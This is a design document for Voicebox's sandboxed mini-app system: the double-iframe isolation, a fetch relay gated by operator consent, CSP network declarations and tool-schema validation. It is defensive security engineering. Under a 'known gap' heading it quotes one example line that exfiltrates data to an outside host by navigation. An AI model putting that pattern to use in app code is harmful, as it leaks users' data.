# Interactive Mini-Apps Architecture (Web MCP)

Voicebox can launch interactive HTML mini-apps—calculators, games, visualizers, dashboards, and custom UI tools—directly inside the workspace and allow the voice assistant to control them in real time through **Web MCP (Web Model Context Protocol)**.

Because mini-app code may be model-generated or third-party HTML/JavaScript, Voicebox isolates every mini-app inside a **Double-Iframe Sandbox** (`core/mini-app.ts`, `public/mini-app-bridge.js`, `public/mini-app-sdk.js`).

---

## 1. Threat Model & Isolation Goals

An untrusted mini-app executes arbitrary HTML, CSS, and JavaScript. The sandbox prevents it from:
1. **Reading Host Origin Storage**: Cannot access the Voicebox host's `localStorage`, `sessionStorage`, `document.cookie`, `IndexedDB`, or Origin Private File System (OPFS). (The injected SDK provides a transient, document-local in-memory `Storage` shim so apps that call `localStorage.getItem`/`setItem` work without throwing a `SecurityError`.)
2. **Calling Host APIs**: Because the inner iframe has an opaque `"null"` origin, browser CORS policies block direct `fetch()` calls to `/api/file`, `/api/turn`, or `/api/execute`. The relay described in §2.1 is the only path it has, and that path is a POLICY: an explicit table of reads it may perform, and NO way to mutate host state except by asking the room's operator (see §2.1).
3. **Hijacking Navigation or Modals**: Top-level navigation, popups, and blocking `alert()`/`prompt()` dialogs are disabled by the iframe `sandbox` attribute.
4. **Spoofing Ambient `postMessage` Events**: All communication travels over a private, transferred `MessagePort` rather than ambient window messages.
5. **Hanging or Exhausting the Host**: Tool calls are bounded by a 5,000ms timeout and a 64 KiB output limit.
6. **Malformed or Unbounded Tool Arguments**: Inbound tool arguments from models or external callers are validated against each tool's declared JSON schema (`validateMiniAppToolArgs()`), rejecting missing required parameters, type/enum mismatches, or oversized argument payloads before dispatching to the sandboxed app (`voicebox-beads-fdtu`).

---

## 2. Double-Iframe Architecture

```
┌────────────────────────────────────────────────────────────────────────┐
│ Voicebox Host Room (Same Origin: http://127.0.0.1:8787)                │
│                                                                        │
│ • Live Voice Session (Gemini Live / OpenAI Realtime)                   │
│ • MiniAppRegistry: tracks active apps and exposes Web MCP tools        │
│ • Pop-over container (#mini-app-container) & launcher (#sqeh-actions)  │
│ • Verifies e.source === outer.contentWindow on bridge handshake        │
│                                                                        │
│ ┌────────────────────────────────────────────────────────────────────┐ │
│ │ Outer Mediator Bridge (/mini-app-bridge.html, Same Origin)         │ │
│ │                                                                    │ │
│ │ • Verifies event.origin === window.location.origin & window.parent │ │
│ │ • Verifies event.source === inner.contentWindow on mini_app_ready  │ │
│ │ • Validates Web MCP tool schemas (validateWebMcpTool)              │ │
│ │ • Enforces 64 KiB output cap and 5,000ms execution timeout         │ │
│ │ • Creates fresh MessageChannel on each inner load and transfers    │ │
│ │   port2 to the inner sandboxed frame                               │ │
│ │                                                                    │ │
│ │ ┌────────────────────────────────────────────────────────────────┐ │ │
│ │ │ Inner Sandboxed Mini-App (<iframe id="inner-app">)             │ │ │
│ │ │ Attribute: sandbox="allow-scripts"                             │ │ │
│ │ │ Origin: "null" (Opaque Sandbox Origin)                         │ │ │
│ │ │                                                                │ │ │
│ │ │ • Verifies event.source === window.parent on handshake         │ │ │
│ │ │ • Registers tools via document.modelContext.registerTool(...)  │ │ │
│ │ │ • Communicates exclusively over transferred MessagePort        │ │ │
│ │ └────────────────────────────────────────────────────────────────┘ │ │
│ └────────────────────────────────────────────────────────────────────┘ │
└────────────────────────────────────────────────────────────────────────┘
```

### Why Two Nested Iframes?
- **Outer Mediator Bridge (`/mini-app-bridge.html`)**: Runs on the same origin as the Voicebox room so the host window can verify `event.origin === window.location.origin` and `e.source === outer.contentWindow` to prevent foreign frames from triggering spoofed premature handshakes. When receiving `mini_app_ready`, the bridge strictly verifies `event.source === inner.contentWindow` before transferring the MessagePort, preventing decoy frames from forcing port churn or intercepting handshake transfers (`voicebox-beads-221y`).
- **Inner Sandboxed Frame (`sandbox="allow-scripts"`)**: Runs in a unique opaque origin (`"null"`). On every load or reload of the inner document, the outer bridge creates a fresh `MessageChannel` and transfers `port2` into the inner frame. The inner SDK strictly verifies `event.source === window.parent` before accepting `mini_app_handshake` and adopting the port, ensuring other frames in the document cannot hijack the app's tool execution channel; the inner document itself remains the trusted counterparty for tool execution.

---

## 2.1 The Fetch Relay Is a Policy, Not a Proxy (`public/relay-policy.mjs`, `voicebox-beads-j6im`)

The relay exists because an opaque-origin frame cannot `fetch()` the room's own API (voicebox-beads-v1k6): the landing inspector showed fabricated branches while 23 real ones sat behind an API it could not read. For a while the relay admitted **any same-origin path and any method**, fetched with the bridge page's own authority — and `server.mjs` treats a request carrying this page's `Origin` as the room operator (`hasExtensionAuthority`). So app code could ask the bridge for `POST /api/branches/merge` and the merge ran: `git checkout` + `git merge` on the host repository, with the frame's say-so as the only authorization. Same-origin admission is not evidence that the frame is the room UI.

`public/relay-policy.mjs` is now the single classification site — one function, three outcomes, both allowlists as tables inside it so the same source is embedded in the frame SDK (`String(relayPolicy)`) and can never drift from the bridge's copy:

| Outcome | When | What happens |
|---|---|---|
| `read` | `GET`/`HEAD` of a path named in the read table (`/api/health`, `/api/branches/candidates`, `/api/branches/diff`, `/api/harnesses`, `/api/tasks`, `/api/mini-apps`, `/api/changelog`, `/api/doctor`, `/api/agents`, `/api/tools`, `/api/presence`, `/api/fleet`, `/api/activity`, `/api/extensions`, `/api/extensions/catalogue`, `/api/gemini/capabilities`) | The bridge relays it, as before. Deliberately absent: `/api/keys`, `/api/agent-settings`, `/api/root`, `/api/file(s)`, `/api/grep` — configuration secrets and workspace file bytes are not a sandboxed app's read capability. |
| `host-action` | A route named in the host-action table (`POST /api/branches/merge`, `POST /api/branches/keep-separate`, `POST /api/harnesses/configure`, `POST /api/tasks/delegate`) | **The bridge never fetches it.** It posts `host_action_request` to the room, which re-checks the same table and renders a consent bar in the mini-app card — the app id, the plain-language action, the route and a preview of the body (a FormData is described entry by entry). Allow performs the fetch from the ROOM with its own authority; Deny, the two-minute prompt timeout, or closing the app answers a refusal and sends nothing. One host action may be pending at a time. The wait is TWO phases — consent, then dispatch — and an answer that ends the second phase says it is INDETERMINATE rather than claiming nothing was sent (see below). |
| `refuse` | Anything else | Refused by name (`relay-read-not-approved`, `relay-mutation-not-approved`, `relay-bad-path`, `relay-no-method`) with the reason, and nothing leaves the frame. |

Two consequences worth stating plainly:

- **The app never holds the room's authority.** The approval is a click in the room's own DOM, outside the iframe — app HTML cannot draw over it, restyle it or script it — and the room performs the request itself. The route's REAL status and body bytes go back to the app, so an app that says "Landed …" is still reporting the server's answer (the `voicebox-beads-ulhi` rule).
- **A dispatched request is never reported as "nothing was sent".** The bridge's wait is two clocks, not one (`voicebox-beads-a96w`): `hostActionConsentMs` (180 s) covers the wait for a person, and while it runs nothing has been dispatched, so its expiry may honestly say "nothing was sent". That window is deliberately LONGER than the room's own `HOST_ACTION_CONSENT_MS` (120 s), because the room renders its bar a round trip after the bridge starts waiting: with equal windows the relay could give up first, tell the app nothing had been sent, and leave a still-clickable Allow that then performed the mutation — the round-2 form of the finding. Outwaiting makes the expiry true, and the relay also posts `host_action_cancel` before answering the app so a bar that somehow outlives it is dropped rather than obeyed; the room then posts `host_action_state: executing` immediately BEFORE it fetches, which retires that clock and arms `hostActionFetchMs` (180 s). If that second clock expires, or the room's own bounded fetch (`HOST_ACTION_FETCH_MS`, 120 s, an `AbortController`) is abandoned or fails, the app receives `ok: false, indeterminate: true` and an error saying the request "may have been applied". One 120 s clock covering both phases was the finding: a slow operator plus a slow route exhausted it during the room's fetch, and the app was told "nothing was sent" after a branch had been merged. The frame's own SDK backstop is longer than both phases together and says the outcome is UNKNOWN rather than never sent.
- **The tool budget does not run while a person is deciding.** A tool call that raises a host action is waiting on a human, so the bridge's 5 s call bound and the room's 5.5 s bound are suspended while a prompt is unanswered and resume afterwards. The wait is still bounded: the prompt answers itself after two minutes, and only one may be pending.

The consent bar is PREPENDED to the app's viewport, not appended: the card is anchored bottom-right and the floating bubble dock (z-index 110) sits over its lower-right corner, so a bar below the frame was a bar a real mouse could press but never click — measured, the press landed on the button and the release on `.mini-app-bubble`.

Verification: `tests/mini-app-relay-policy.test.mjs` drives the real bridge module in a VM with a fake DOM, a fake MessagePort pair and a fake room, and speaks to it exactly as the sandboxed frame does — the reviewer's `POST /api/branches/merge` repro never reaches `fetch`, only an answered prompt lets it through, and the denied/refused cases send nothing. Five cases pin the two-phase wait (`voicebox-beads-a96w`): an approval answered after the consent clock would have expired still reaches the app (the reviewer's repro, with the module's own bounds accelerated rather than waited out), a dispatched request that goes silent answers `indeterminate` and must NOT contain "nothing was sent", an unanswered prompt answers `host-action-no-operator` with nothing sent and CANCELS the room first (`host_action_cancel`, so no live Allow outlives the refusal), and the two consent windows are pinned numerically — the relay must outwait the room — because a 120 s browser wait cannot be driven. The room's side of that protocol is pinned by ordering — the `executing` message must precede the fetch, the fetch must be abortable, and the failure path must be indeterminate — with `tests/landing-inspector-actions.test.mjs` and `tests/mini-app-relay-formdata.test.mjs` driving the room's real fetch from a real browser. The room-mounted inspector is also driven for real: the prompt names the app, the route and the branch, the merge does not happen until Allow, a Deny lands nothing, and `tests/mini-app-relay-formdata.test.mjs` asserts the multipart BYTES on the wire after an approval.

---

## 2.2 No Network Unless Declared and Allowed (`public/app-network-policy.mjs`, `voicebox-beads-cwx5.16`)

The sandbox keeps an app away from the host. It does not keep the user's data away from the internet: until this policy the inner frame ran with no content security policy, so app code could load a script from, or send a tool call's arguments to, any origin.

Every app document now starts with a default-deny CSP, injected as the first element after the doctype (a `<meta>` policy governs only what is parsed after it, so "inside `<head>`" is not early enough; and only a standard `<!doctype html>` behind plain HTML whitespace is kept, because anything else in front, such as a no-break space, would push the policy into the body where it is ignored). With no declaration an app can run its own inline script and style, use `data:` and `blob:` images, and load files from the Voicebox server itself (the built-in apps import their modules from `/apps/`). It cannot fetch, open a socket, load a remote script, submit a form, embed a frame or open a WebRTC connection.

An app that needs an outside origin declares it, using the field names MCP Apps uses for the same idea (`_meta.ui.csp`):

```html
<script type="application/voicebox-app+json">
{ "csp": { "connectDomains": ["https://api.example.com"], "resourceDomains": ["https://cdn.jsdelivr.net"] } }
</script>
```

| Field | Grants |
| --- | --- |
| `connectDomains` | `fetch`, XHR, WebSocket and EventSource to these origins (`connect-src`) |
| `resourceDomains` | scripts, styles, images, fonts and media from these origins |

Rules for an entry: an `https://` or `wss://` origin, optionally with a port or one leading wildcard label (`https://*.example.com`). Refused, with the reason shown in the app card: `http`/`ws`, a path, query or credentials, an IP address, `localhost`, a bare `*`, a wildcard over a whole top-level domain, and anything past 16 entries per list.

**A declaration is a request, not a grant.** Declarations are often written by a model. The room (`public/components/mini-app-network.mjs`) mounts the app offline and shows a bar in the app card, outside the app's frame, naming every origin, with **Allow** and **Keep offline**. Allow stores the approval in `localStorage` (`voicebox.mini_app_network_approvals.v1`) for that app and that exact set of origins, then remounts the app with the grant. "That app" is where it came from plus what it calls itself (environment or source, then app id or file name), taken before the card collapses apps that share a title, so an app that borrows an approved app's title is still asked. If the browser cannot store the approval it holds for the page session. If the app later asks for a different set, the stored approval no longer matches and the person is asked again. Keep offline lasts until the page is reloaded. The bridge narrows whatever grant it is handed to what the document itself declares, so a grant can never add an origin.

**A blocked load is visible.** The injected SDK listens for `securitypolicyviolation` and the room shows "Blocked: this app tried to reach …", so an app that needs an undeclared CDN says so instead of looking broken.

**Known gap: navigation.** CSP has no directive that stops a frame navigating itself (`location.href = "https://elsewhere/?" + data`, a link click, a meta refresh). The app dies when it does this, but the URL is sent. Closing it needs the bridge to detect the navigation and tear the frame down, or a network-level control; it is tracked as its own bead.

`tests/app-network-policy.test.mjs` pins the parser, the validation and the policy text; `tests/mini-app-network.test.mjs` mounts apps in a real browser, attaches to the sandboxed frame's own target and asserts which hosts its requests actually reached before and after Allow.

## 3. Authoring Mini-Apps with WebMCP (`document.modelContext`)

A Mini-App is a WebMCP page (`voicebox-beads-cwx5.12`). The bridge injects the SDK into the inner frame right after the network policy, and the app registers tools with the API from the [WebMCP draft](https://webmachinelearning.github.io/webmcp/):

```javascript
await document.modelContext.registerTool({
  name: "set_score",
  description: "Add points to a team on the scoreboard",
  inputSchema: {
    type: "object",
    properties: {
      team: { type: "string", enum: ["home", "away"] },
      points: { type: "number", description: "Points to add" }
    },
    required: ["team", "points"]
  },
  async execute({ team, points }, { signal }) {
    const el = document.getElementById(`${team}-score`);
    el.textContent = String(Number(el.textContent) + points);
    return { ok: true, currentScore: Number(el.textContent) };
  }
});
```

What the SDK implements, and where it is narrower than the draft:

| | Behaviour |
| --- | --- |
| `registerTool(tool, { signal })` | Returns a promise that settles on the **host's** answer. A duplicate name, a missing description or a schema the host refuses rejects with `InvalidStateError`. |
| Unregistering | Abort the `signal` passed to `registerTool`; the tool leaves the room's catalogue. |
| `execute(input, { signal })` | The signal aborts when the host abandons the call (the 5 s bound). |
| Result | Any JSON value, including a plain string, up to 64 KiB. |
| Tool name | The host accepts `^[a-zA-Z0-9_-]{1,64}$`, narrower than the draft's 128 characters with `.`; a longer or dotted name is rejected. |
| `inputSchema` | The strict subset below; an unsupported keyword is a rejection, not a silent drop. |
| Not implemented | `getTools`, `executeTool`, the `toolchange` events, `outputSchema`, `annotations`, `exposedTo`. |

`document.modelContext` is defined as an own property so it shadows a browser-native implementation: a tool registered with the browser itself would never reach the room. `navigator.modelContext`, the name earlier drafts used, is the same object.

**Older names.** `window.webMcp.registerTool({ ..., parameters })` and `window.webMcp.ready()` (also `window.voicebox`) still work and keep their older behaviour: a synchronous throw on a malformed tool, and a second registration of a name replacing the first. The built-in apps still use them. `tests/mini-app-webmcp-surface.test.mjs` drives both surfaces in a real browser.

### The app can speak first (`public/app-messages.mjs`, `voicebox-beads-cwx5.12`)

A tool call lets the model ask the app. Two SDK calls let the app tell the model, with the meaning MCP Apps gives `ui/message` and `ui/update-model-context`:

```javascript
await voicebox.updateModelContext({ home: 3, away: 1 });   // the app's current state; each call replaces the last
await voicebox.sendMessage("The home team scored.");        // the model is told now, and answers
```

Both return a promise that settles on the room's answer, so the app knows whether the model was told. App code is untrusted and the model holds real tools, so:

| Rule | How |
| --- | --- |
| It is never the user's voice | The model receives `[Message from the Mini-App "Title", not from the user. …]` followed by the app's text with every line quoted, so text that imitates the frame stays inside it. It goes straight to the live session and never through the typed-turn path, whose commands act on the host. |
| It is bounded | 2,000 characters per message, 8,000 per context, 6 delivered messages per minute per mounted app. Each refusal names its reason. |
| It is visible | The room's session log shows what the app said. |
| It needs a live session | With no live voice session the promise rejects; nothing is queued. |

**Limit.** `updateModelContext` does not reach the model on its own: the context is held by the room and delivered with the app's next `sendMessage`. A model answering a spoken question learns app state by calling one of the app's tools. Delivering context silently into a running live session differs per provider and is tracked as its own bead.

`tests/app-messages.test.mjs` pins the validation, budget and frame; `tests/mini-app-messages.test.mjs` mounts an app in a real browser and asserts the exact payload handed to the live session.

### Tool Lifecycle during a Voice Session
1. **Registration**: The inner app calls `document.modelContext.registerTool(...)`, sending `{ type: "register_tool", regId, tool }` over the private `MessagePort`; the bridge answers `{ type: "register_result", regId, ok, error }`.
2. **Schema Validation (`core/mini-app.ts`)**: `validateWebMcpTool()` verifies the tool name (`^[a-zA-Z0-9_-]{1,64}$`), description (≤ 1,024 chars), JSON Schema parameters (`type: "object"`), and per-app tool count (`maxTools: 16`).
3. **Live Voice Exposure**: `MiniAppRegistry` converts registered tools into function declarations (`toolsToFunctionDeclarations()`) for the active live voice session.
4. **Voice Execution & Host Argument Validation**: When the user says *"Add three points to the home team"*, the voice model calls `set_score`. The host (`server.mjs`) and outer bridge validate the incoming arguments against the tool's declared JSON schema (`validateMiniAppToolArgs()`). Parameter schemas are strictly validated at registration against an enforceably validated subset:
   - Supported property types: `string`, `number`, `integer`, `boolean`, `array`, `object`.
   - Allowed keyword allowlists per type: `string` (`maxLength`, `minLength`, `enum`), `number`/`integer` (`maximum`, `minimum`, `enum`), `boolean`, `array` (`items` with primitive `type` and `enum`), `object` (`properties`, `required`, `additionalProperties`).
   - Declarations with unsupported keywords (such as `pattern`, `format`, `default`, `items.minLength`, or nested `items.type: "array" | "object"`) or declaring `"__proto__"` in `properties` or `required` are intentionally rejected at registration with `invalid-tool-parameters` to ensure the host only registers schemas it strictly verifies at dispatch.
   - Declarations declaring `enum` alongside bounds (`minLength`, `maxLength`, `minimum`, `maximum`) require all members to match the primitive `type` and at least one member to satisfy declared bounds (rejected at registration if unsatisfiable); individual out-of-bounds members are refused at dispatch.
   - Malformed payloads (missing required properties, prototype-inherited properties, type/enum mismatches, out-of-bounds numbers/strings, unrecognized keys when `additionalProperties: false` is set, array item mismatches, non-index array metadata, own `__proto__` properties, or argument payloads exceeding 64 KiB in UTF-8 bytes) are refused before dispatch with a structured refusal (`refused: missing-argument`, `invalid-argument`, `invalid-argument-type`, `invalid-argument-enum`, `invalid-argument-range`, `invalid-argument-length`, or `invalid-tool-arguments`). Legitimate data keys (`constructor`, `prototype`) are preserved safely on null-prototype snapshots. Unknown tool names fail closed immediately with `refused: unknown-tool`. Valid invocations dispatch `{ type: "call_tool", callId, name, args }` to the inner app, enforce the 5,000ms timeout and 64 KiB response cap, and return the result to the voice model.

---

## 4. Classification: Mini-Apps vs Pages (`lib/mini-app-store.mjs`, `voicebox-beads-rtsr`)

Mini-app discovery walks the workspace (depth ≤ 1), the host shelf (`<extensionsDir>/mini-apps`), and sandbox homes (depth ≤ 2). Before `voicebox-beads-rtsr` the only test was the file extension, so "mini-app" meant "a file whose name ends in `.html`" and the room's Mini-App tray (`#sqeh-actions`) rendered every page in the current folder as an App bubble.

Every discovered entry now carries a **`kind`** — `"app"` or `"page"` — alongside the fields it already had (`appId`, `slug`, `title`, `fileName`, `source`, `sandbox`, `storagePath`, `sizeBytes`, `createdAt`, `updatedAt`, `html`):

| Source | `kind` | Why |
|---|---|---|
| **Host shelf** (`<hostDir>/mini-apps`) | `app` | Only `saveMiniApp` writes there, so a file on the shelf *is* an app. |
| **Sandbox** (`sandboxHomesDir()/<name>`, extra sandbox roots) | `page` | Sandbox `.html` files are treated as pages until explicitly saved/promoted to the shelf via `saveMiniApp`, so `VOICEBOX_SANDBOX_HOMES` never floods the Mini-App tray. |
| **Workspace** (`rootPath`) | `page`, promoted to `app` only when **proven** | A workspace `.html` file is a page unless a shelf record proves it is the app that record describes. |

**Proof, and why it is not the slug.** An existing shelf record names the workspace file it was saved from — `saveMiniApp` writes `workspacePath` (the file's path relative to the workspace root) into `<slug>.meta.json` — and discovery accepts a workspace file as that app only when `workspacePath` equals its own relative path. A legacy shelf record without `workspacePath` cannot prove ownership of a workspace file, even when the bytes or `appId` match: an unrelated file could be identical. Discovery leaves that workspace file as a page with its own title and `page_<slug>` id, takes none of the record's metadata, and **does not claim the slug**, so the shelf file itself is still discovered as the app it is. Deleting the shelf app leaves the unproven page untouched; saving a workspace file under the occupied shelf name is refused `mini-app-name-taken` before any write. Slug alone was never proof — an unrelated page that happened to share a slug inherited the app's `appId` and title.

The live voice reaches the same list through two tools: `list_mini_apps` answers with the saved apps the Home card shows (`kind: "app"`), and `open_mini_app` opens one by title, id or file name. `open_mini_app` never carries html, so opening cannot overwrite an app; `launch_mini_app` stays the tool for building a new app from html.

The classification decides the **list**, not what can be launched: `getMiniApp()` and the `launch_mini_app` verb still resolve a page by name, `file`, `slug`, `appId` or title, and the File Viewer's **Open as Mini-App** action (`#file-run-app`) launches any `.html` file. Saving a page (through the API or the assistant) writes the shelf record that promotes it to an app on the next discovery. The tray reads `kind` and defaults a payload with no `kind` to `app`, so an older server still renders as it did.

### Identity, lookup, deletion and saving, per artifact (`voicebox-beads-dvu8`, `voicebox-beads-p7p1`)
A page carries its own id space — `page_<slug>` beside an app's `app_<slug>` — so two entries never share an id. When a name is ambiguous (a page and a shelf app that share a slug, a file name or a title), the first resolution step that matches anything decides the answer, and **within that step an app outranks a page**: `getMiniApp("collision.html")`, the `launch_mini_app` verb and `DELETE /api/mini-apps?id=…` all mean the app. A page is still found by what only it answers to — its own title, or `page_<slug>` — so launching a page by name is unchanged.

Deletion asks **ownership per artifact**, never per name: an entry deletes its own `storagePath` (for a page, its own workspace file); shelf artifacts are deleted only when the entry is an **app** and the shelf record there is that app's record (matched by the `appId` inside it); a workspace file is deleted only for a **proven workspace app** — a shelf entry that merely shares the page's name owes the workspace nothing. That closes cross-deletion in both directions: deleting an unrelated page no longer destroys the same-slug shelf app, and deleting a shelf app no longer deletes the page.

Saving asks the same question: the target is the **file** the caller named (a workspace entry with that name wins), and a save that would take a shelf name already owned by a **different** app is refused `mini-app-name-taken`, naming the app, with nothing written — rather than overwriting that app's copy and record. Promoting a page whose name is free stays the supported path, and the promoted app takes the canonical `app_<slug>` id.

---

## 5. Enforced Bounds (`core/mini-app.ts`, `public/mini-app-bridge.js`)

| Bound | Limit | Enforcement Point | Behavior When Exceeded |
|---|---|---|---|
| **Iframe Sandbox** | `sandbox="allow-scripts"` | `<iframe id="inner-app">` | Blocks host storage, cookies, top navigation, and modals. |
| **Max Tools per App** | `16` | Outer Bridge & `MiniAppRegistry` | Excess tool registrations are rejected. |
| **Max Tool Output** | `64 KiB` (`65,536` bytes) | Outer Bridge | Refused with `"output over budget (max 64KB)"`. |
| **Tool Execution Timeout** | `5,000ms` (suspended while a host-action prompt is unanswered) | Outer Bridge | Refused with `"tool execution timed out after 5000ms"`. |
| **Relayed Reads** | Explicit path table | `public/relay-policy.mjs` (frame SDK, bridge and room) | Refused with `relay-read-not-approved` for any other path. |
| **Relayed Mutations** | NONE — host-action table only, with operator consent | `public/relay-policy.mjs` + room consent bar | Refused with `relay-mutation-not-approved`; an approved action is performed by the room, never the bridge. |
| **Host-Action Consent Wait** | `120,000ms`, one pending at a time | Room (`public/components/mini-app-surface.mjs`) | Denied with a named refusal; nothing is sent. |
| **Tool Arguments Schema & Bounds** | Declared JSON schema, max 64 KiB | Host & Outer Bridge | Refused with `missing-argument`, `invalid-argument-type`, `invalid-argument-enum`, or `invalid-tool-arguments`. |
| **Tool Arguments Depth & Nodes** | Max 32 nesting levels, max 2048 nodes | Host & Outer Bridge | Refused with `invalid-argument-bounds`. |
| **Tool Schema Depth & Nodes** | Max 16 nesting levels, max 512 nodes | Host (`validateWebMcpTool`) & Bridge | Refused with `invalid-tool-parameters`. |
| **Relay Body Bound** | 64 KiB (`65,536` bytes) across the body the frame sends | Frame and bridge (`public/relay-body.mjs`, one implementation embedded with `String(relayBody)`) | Measured in **UTF-8 bytes**, not in string length: a text body's UTF-8 length is computed code point by code point (so astral characters cost 4 bytes and a 2-unit surrogate pair is not counted twice), `URLSearchParams` is measured on its percent-encoded form, and a `FormData` sums its FIELD NAMES as well as its values. Before `voicebox-beads-r5wq` these compared UTF-16 code units, so 30,000 emoji (60,000 units, 120,000 bytes) passed a 64 KiB bound. |
| **Tools Registration Body** | Max 64 KiB (`65,536` bytes) | Host (`POST /api/mini-app/tools`) | Refused with HTTP 400 (`body-too-large`). This route predates the server's shared JSON door (voicebox-beads-d808) and keeps its own stricter bound and status; every other JSON route answers `413 body-too-large` from the door. |
| **Tool Name Format** | `1–64` chars (`a-zA-Z0-9_-`) | `validateWebMcpTool()` | Refused with `invalid-tool-name`. |
| **Handshake Source** | `inner.contentWindow` / `window.parent` | Outer Bridge & Inner SDK | Drops unverified postMessage frames from decoy frames. |

### Verification Suite
```bash
node --test tests/mini-app-architecture.test.mjs
```

---

## 5. A Shared Name Is Not Ownership (`voicebox-beads-dvu8`)

A workspace file and a shelf app can share a slug **and** a file name — the store keys the shelf by slug, and a workspace page may happen to be called `collision.html` beside a shelf app of the same name. Deleting or overwriting on the strength of that name destroyed data in both directions, so ownership is asked per artifact and answered only by explicit provenance:

- **The record owns the shelf copy named inside it and its own `.meta.json`** — matched by the `appId` the record carries, never by the file name alone.
- **A workspace file is deleted only when the record NAMES it** as its own copy (`workspacePath`, written by every save that has a workspace copy). Two weaker signals are deliberately not accepted: a matching `appId` — a workspace file inherits the appId of the record at its slug, so the two always agree and the comparison proves nothing — and byte-for-byte equality, because an unrelated file that happens to be identical is indistinguishable from a copy. A record written before `workspacePath` existed therefore proves nothing about the workspace, and the file is left in place: failing closed costs a leftover file, failing open costs the file.
- **A save that would write a workspace copy is REFUSED (`mini-app-name-taken`) when the record at that slug does not name the file being saved** — before any write of any kind, not even a directory, so "refused" cannot hide a side effect. An update of an app and a different file that merely shares its name are byte-identical states, so the save does not guess; the refusal message names the app that holds the name and the way forward. A save with no workspace root still updates such an app's own shelf copy in place, and deleting the app is what lets a colliding file be saved as an app of its own. This is the transitional cost of the rule: an app saved by a build that predates `workspacePath` cannot be updated *through its workspace file* until its record names one, so the app is deleted and re-saved once. The mini-app/page classification makes an app and a page distinct entries, so the refusal names the right owner rather than resting on provenance alone; it does not by itself answer the question for a record that names no file.
- **`saveMiniApp` writes `workspacePath`** into the record for every save that has a workspace copy, so later ownership is decided by reading the record rather than by comparing bytes — a comparison a concurrent write can race. A host-only save omits the field rather than pointing at a file that is not there.
